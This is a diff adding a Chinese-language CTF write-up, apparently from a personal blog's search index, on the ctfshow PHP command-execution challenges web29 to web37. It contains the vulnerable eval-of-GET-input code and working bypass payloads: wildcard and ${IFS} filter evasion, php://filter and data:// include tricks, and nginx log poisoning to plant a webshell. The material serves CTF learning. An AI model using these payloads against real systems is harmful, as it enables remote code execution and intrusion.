@@ -7106,4 +7106,175 @@
         <tag>玄机第四章windows实战</tag>
       </tags>
   </entry>
+  <entry>
+    <title>web入门命令执行篇-ctfshow</title>
+    <url>/2024/12/02/web%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87-ctfshow/</url>
+    <content><![CDATA[<h1 id="0x01基础知识"><a href="#0x01基础知识" class="headerlink" title="0x01基础知识"></a>0x01基础知识</h1><h1 id="0x02题目"><a href="#0x02题目" class="headerlink" title="0x02题目"></a>0x02题目</h1><h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><h3 id="绕过flag"><a href="#绕过flag" class="headerlink" title="#绕过flag"></a>#绕过flag</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>代码分析:</p>
+<ul>
+<li>error_reporting(0)是php中用于关于报错的回显，如果有错误信息，不会直接显示出来。</li>
+<li>isset()函数是php中检查定义的值中是否为空，如果不为空将会继续，若是为空就执行 highlight_file(<strong>FILE</strong>)用于显示当前文件。</li>
+<li>!preg_match(“&#x2F;flag&#x2F;i”, $c)函数是检查$c中是否包含flag（不区分大小写）</li>
+</ul>
+<h3 id="preg-match-函数"><a href="#preg-match-函数" class="headerlink" title="preg_match ()函数"></a><strong>preg_match ()函数</strong></h3><p>匹配正则表达式模式，分隔符后的”i”标记这是一个大小写不敏感的搜索</p>
+<p>模式中的\b标记一个单词边界，所以只有独立的单词会被匹配，如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (preg_match(&quot;/\bweb\b/i&quot;, &quot;PHP is the web scripting language of choice.&quot;)) ：   True </span><br><span class="line">if (preg_match(&quot;/\bweb\b/i&quot;, &quot;PHP is the website scripting language of choice.&quot;)) ：   False</span><br></pre></td></tr></table></figure>
+
+<p>小技巧：如果仅仅想要检查某个字符串是否包含另外一个字符串，不要使用 preg_match() ， 使用 strpos() 会更快。</p>
+<ul>
+<li>eval($c)是将$c当做代码进行执行</li>
+</ul>
+<p>这里的话就是绕过flag</p>
+<p>1.使用一对单引号‘绕过flag</p>
+<p>2.使用\绕过flag</p>
+<p>3.?或者*等通配符绕过flag</p>
+<h3 id="LINUX通配符"><a href="#LINUX通配符" class="headerlink" title="LINUX通配符"></a><strong>LINUX通配符</strong></h3><p>配符是由shell处理的, 它只会出现在 命令的“参数”里。当shell在“参数”中遇到了通配符时，shell会将其当作路径或文件名去在磁盘上搜寻可能的匹配：若符合要求的匹配存在，则进行代换(路径扩展)；否则就将该通配符作为一个普通字符传递给“命令”，然后再由命令进行处理。总之，通配符 实际上就是一种shell实现的路径扩展功能。在 通配符被处理后, shell会先完成该命令的重组，然后再继续处理重组后的命令，直至执行该命令。</p>
+<table>
+<thead>
+<tr>
+<th>*</th>
+<th>匹配任何字符串／文本，包括空字符串；*代表任意字符（0个或多个）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>?</td>
+<td>匹配任何一个字符（不在括号内时）?代表任意1个字符</td>
+</tr>
+<tr>
+<td>[abcd]</td>
+<td>匹配指定字符范围内的任意单个字符</td>
+</tr>
+<tr>
+<td>[a-z]</td>
+<td>表示范围a到z，表示范围的意思</td>
+</tr>
+</tbody></table>
+<p>对于linux cat和ca’’t ca\t ca””t效果是相同的 这样同样可以绕过字符的限制</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=system(&quot;ls&quot;);#查看目录</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241202221351137.png" alt="image-20241202221351137"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=system(&quot;tac%20fla?.php&quot;);</span><br><span class="line">?c=system(&quot;tac%20fla*&quot;);</span><br><span class="line">?c=system(&quot;tac%20fla\g.php&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>非预期解</p>
+<p>1.写入一句话木马用蚁剑连接</p>
+<p>2.函数套用?c&#x3D;highlight_file(next(array_reverse(scandir(“.”))));</p>
+<p>3.内敛执行?c&#x3D;echo%20<code>tac%20fla*</code>;</p>
+<p>4.利用参数输入?c&#x3D;eval($_GET[1]);&amp;1&#x3D;phpinfo();</p>
+<p>5.利用include参数输入?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
+<p>6.利用cp命令将flag拷贝到别处?c&#x3D;system(“cp%20fl*g.php%20a.txt%20”);然后浏览器访问a.txt，读取即可。</p>
+<h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><h3 id="绕过system"><a href="#绕过system" class="headerlink" title="#绕过system"></a>#绕过system</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其实与上一题的做法是不变的，只是我们需要绕过system去执行命令，这里我们可以用passthru命令函数</p>
+<h3 id="passthru函数"><a href="#passthru函数" class="headerlink" title="passthru函数"></a><strong>passthru函数</strong></h3><p>passthru 函数是一个内置函数，其<strong>作用是执行一个外部命令，并将原始的输出直接输出到浏览器或命令行界面</strong>，而不需要经过 PHP 的输出缓冲区。这意味着你<strong>可以通过</strong> <strong>passthru</strong> <strong>函数运行系统命令</strong>，并实时地看到这些命令的输出，包括任何颜色代码或格式控制字符。</p>
+<h3 id="php执行系统命令函数"><a href="#php执行系统命令函数" class="headerlink" title="php执行系统命令函数"></a><strong>php执行系统命令函数</strong></h3><ul>
+<li><p>system : 执行外部程序，并且显示输出，如果 PHP 运行在服务器模块中， system() 函数还会尝试在每行输出完毕之后， 自动刷新 web 服务器的输出缓存。如果要获取一个命令未经任何处理的 原始输出， 请使用 passthru() 函数。</p>
+</li>
+<li><p>exec ： 执行一个外部程序,回显最后一行,需要用echo输出。</p>
+</li>
+<li><p>shell_exec ： 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。</p>
+</li>
+<li><p>popen ： 打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。</p>
+</li>
+<li><p>proc_open ： 执行一个命令，并且打开用来输入&#x2F;输出的文件指针。</p>
+</li>
+<li><p>passthru ： 执行外部程序并且显示原始输出。同 exec() 函数类似， passthru() 函数 也是用来执行外部命令（command）的。 当所执行的 Unix 命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 exec() 或 system() 函数。 常用来执行诸如 pbmplus 之类的可以直接输出图像流的命令。 通过设置 Content-type 为 image&#x2F;gif， 然后调用 pbmplus 程序输出 gif 文件， 就可以从 PHP 脚本中直接输出图像到浏览器。</p>
+</li>
+<li><p>pcntl_exec() ： 在当前进程空间执行指定程序，当发生错误时返回 false ，没有错误时没有返回。</p>
+</li>
+<li><p>&#96;（反引号）：同 shell_exec()</p>
+</li>
+</ul>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=passthru(&quot;ls&quot;);</span><br><span class="line">?c=passthru(&quot;tac%20fla*&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>非预期解的话只要不影响到system的话其实都可以正常使用，如果有system的话换成其他的函数就可以了</p>
+<h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><h3 id="绕过cat和php"><a href="#绕过cat和php" class="headerlink" title="#绕过cat和php"></a>#绕过cat和php</h3><p>过滤了flag，system，php,cat,sort,shell,’.‘,’ ‘,’&#39;‘</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="绕过cat"><a href="#绕过cat" class="headerlink" title="绕过cat"></a>绕过cat</h3><p>tac  从最后一行开始显示文件内容</p>
+<p>more：</p>
+<ul>
+<li>用于分页查看文件内容。</li>
+<li>支持通过空格键向下翻页，b键向上翻页，q键退出查看。</li>
+<li>还可以搜索指定文本，并支持设置每屏显示的行数。</li>
+</ul>
+<p>less：</p>
+<ul>
+<li>类似于more，但功能更强大。</li>
+<li>支持方向键上下滚动，空格向下翻页，b向上翻页。</li>
+<li>可以显示行号，支持搜索指定字符串，并可以方便地查找和浏览文件内容。</li>
+<li>使用q键退出查看。</li>
+</ul>
+<p>head：</p>
+<ul>
+<li>用于查看文件的开头部分。</li>
+<li>默认显示文件的前10行，但可以通过指定参数来显示更多或更少的行数或字节数。</li>
+<li>支持与其他命令结合使用，如管道命令。</li>
+</ul>
+<p>sort：</p>
+<ul>
+<li>用于对文本文件内容进行排序。</li>
+<li>支持多种排序方式，如按字母、数字、逆序排序等。</li>
+<li>还可以合并已排序的文件，删除重复行，以及检查文件是否已经排序。</li>
+</ul>
+<p>tail：</p>
+<ul>
+<li>用于显示文件的末尾内容。</li>
+<li>默认显示文件的最后10行，但可以通过指定参数来显示更多行数。</li>
+<li>支持实时追踪文件的变化，并持续显示新增的内容，适用于查看日志文件等动态更新的文件。</li>
+</ul>
+<p>当然也可以像绕过flag那样进行cat的绕过</p>
+<h3 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h3><p>&lt; &lt;&gt; 重定向符 </p>
+<p>%20(space) </p>
+<p>%09(tab)</p>
+<p> $IFS$1 </p>
+<p><strong>${IFS}（最好用这个）</strong> </p>
+<p>$IFS </p>
+<p>%0a  换行符 </p>
+<p>{cat,flag.txt} 在大括号中逗号可起分隔作用</p>
+<p>$ {IFS},$ IFS,$ IFS $ 9的区别</p>
+<p>首先$ IFS在linux下表示分隔符，只有cat$ IFSa.txt的时候,bash解释器会把整个IFSa当做变量名，所以导致没有办法运行，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用，而$9指的是当前系统shell进程的第九个参数的持有者，就是一个空字符串，因此$9相当于没有加东西，等于做了一个前后隔离。</p>
+<p>这里我们用${IFS}代替空格</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=passthru(&quot;ls&quot;);发现可以回显，证明并没有用过滤双引号</span><br><span class="line">?c=passthru(&quot;ca\t$&#123;IFS&#125;fla?????&quot;);</span><br></pre></td></tr></table></figure>
+
+<p><strong>但语句是错误的，后来看了很多大佬的wp，才知道:</strong></p>
+<p>因为在linux里面<strong>当转义符号()转义普通字符的时候，和普通字符原来的效果是一样的</strong>，意思就是\t和t都是t，只有在转义特殊字符的时候，才起了作用，比如$，$则不再表示变量的意思。</p>
+<p>注意：上面的$需要用反斜杠进行转义</p>
+<p>?c&#x3D;passthru(“tac\${IFS}fla*”);</p>
+<p>然后可以获取flag</p>
+<h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241202223226048-1733149950287-7.png" alt="image-20241202223226048"></p>
+<p>这次过滤了更多了，过滤了&#x2F;flag|system|php|cat|sort|shell|.| |&#39;|`|echo|;|(&#x2F;</p>
+<p>再像前几关一样直接输入命令执行不大可能了，因为括号，分号，反引号都被过滤掉了,所以我们这里的话可以用上第一题里面的非预期解去做</p>
+<h3 id="1-带参数输入"><a href="#1-带参数输入" class="headerlink" title="1.带参数输入"></a><strong>1.带参数输入</strong></h3><p><strong>?&gt;代替分号</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br><span class="line">?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(&quot;tac flag.php&quot;)?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-日志注入"><a href="#2-日志注入" class="headerlink" title="2.日志注入:"></a><strong>2.日志注入:</strong></h3><p>日志包含漏洞的成因还是服务器没有进行严格的过滤 ，导致用户可以进行任意文件读取，</p>
+<p>但是前提是服务器需要开启了记录日志的功能才可以利用这个漏洞。</p>
+<p>对于Apache，日志存放路径：&#x2F;var&#x2F;log&#x2F;apache&#x2F;access.log</p>
+<p>对于Ngnix，日志存放路径：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log 和 &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log</p>
+<p>中间件的日志文件会保存网站的访问记录,比如HTTP请求行,User-Agent,Referer等客户端信息，如果在HTTP请求中插入恶意代码,那么恶意代码就会保存到日志文件中,访问日志文件的时候，日志文件中的恶意代码就会执行,从而造成任意代码执行甚至获取shell。</p>
+<p>Nginx中的日志分两种，一种是error.log，一种是access.log。error.log可以配置成任意级别，默认级别是error，用来记录Nginx运行期间的处理流程相关的信息；access.log指的是访问日志，用来记录服务器的接入信息（包括记录用户的IP、请求处理时间、浏览器信息等）。</p>
+<p>做法:</p>
+<p>url&#x2F;?c&#x3D;include$_GET[1]?%3E&amp;1&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
+<p>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log是nginx默认的access日志路径，访问该路径时，在User-Agent中写入一句话木马，然后用中国蚁剑连接即可</p>
+<h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241202223505176.png" alt="image-20241202223505176"></p>
+<p>比web32多过滤了一个双引号,但33和32都是一个解题方法</p>
+<h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241202223753099.png" alt="image-20241202223753099"></p>
+<p>比web33多过滤了一个冒号，但不影响我们用伪协议</p>
+<h2 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h2><p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241202223810603.png" alt="image-20241202223810603"></p>
+<p>比web34多了&lt;和&#x3D;，同上</p>
+<h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h2><p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241202223826336.png" alt="image-20241202223826336"></p>
+<p>一样的解题方法通杀，只是参数不要写成数字就行了</p>
+<h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h2><h3 id="include包含"><a href="#include包含" class="headerlink" title="#include包含"></a>#include包含</h3><p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241202224028444.png" alt="image-20241202224028444"></p>
+]]></content>
+      <categories>
+        <category>ctfshow</category>
+      </categories>
+      <tags>
+        <tag>命令执行</tag>
+      </tags>
+  </entry>
 </search>
